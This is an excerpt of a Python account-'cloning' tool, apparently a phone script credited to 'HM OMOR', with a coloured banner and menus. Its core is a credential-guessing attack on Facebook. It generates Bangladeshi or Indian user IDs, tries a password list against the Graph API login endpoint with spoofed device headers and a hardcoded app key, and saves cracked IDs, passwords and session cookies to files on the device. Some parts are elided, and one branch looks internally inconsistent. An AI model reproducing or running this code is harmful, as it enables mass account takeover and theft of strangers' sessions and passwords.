...
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mDEVELOPER \033[1;91m :   \033[1;92mHM OMOR
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mFACEBOOK \033[1;91m  :   \033[1;92mHM OMOR
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mTOOL TYPE \033[1;91m :   \033[1;92mFILE RANDAM
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mVERSION \033[1;91m   :   \033[1;92mPREMIUM
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
#{ MENU }#
def menu():
    clear()
    print(f"{A}|2| RANDOM CLONING");print(f"{A}|4| EXIT CLONING");linex();option = input(f'{A}|?| CHOICE : ')
    if option in ['A','1']:__Randmx__()
    elif option in ['B','2']:__Filex__()
...
def __Randmx__():
	clear()
	print(f"{A}|1| BANGLADESH CLONING");print(f"{A}|2| INDIA CLONING");linex();option = input(f'{A}|?| CHOICE : ')
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                print(f'\r\r\x1b[38;5;46m|OMOR-OK| {str(uid)} | {pas} ')
                                #print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{Y}|OMOR-CP| {str(uid)} | {pas} ')
                                open('/sdcard/-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
...
def __Randm_M2__(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ____uax____(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        ...
                        if 'session_key' in po:
                                ...
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|OMOR-CP| {str(uid)} | {pas} ')
                                open('/sdcard/-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
